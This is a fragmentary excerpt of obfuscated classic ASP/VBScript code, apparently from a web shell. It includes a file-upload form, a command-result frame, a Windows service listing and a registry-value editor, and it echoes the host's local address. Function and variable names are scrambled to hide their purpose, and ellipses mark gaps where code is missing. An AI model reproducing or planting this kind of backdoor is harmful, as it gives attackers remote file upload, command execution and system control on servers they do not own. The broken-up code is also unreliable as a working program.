...
adwba"Go"
zro
eedi"<form method=""post"" id=""upform""action="""&ykzg&"""enctype=""multipart/form-data"">"
pisa"file","file","","",""
echo"Save As : "
...
echo"<iframe id='cmdResult' class='frame' frameborder='no'></iframe>"
End Sub
Sub ylka()
fpx("Service List")
Dim glip,bond,kbap
...
igl
xlvqe
echo"<li>Multi string value splits with ',',you can create new items,or just modify what exists : )</li><hr>"
ykoo()
Set bnes=Nothing
End Sub
Sub ykoo()
...
If tmpdmStr<>""Then tmpdmStr=tmpdmStr&""
...
<tr class="head">
<td style="width:30%"><%=gbba("LOCAL_ADDR")&"("&xnqtl&")"%></td>
<td align="center" style="width:40%">
<b><%adutj xacj,"#0099FF","3"%></b>
</td>
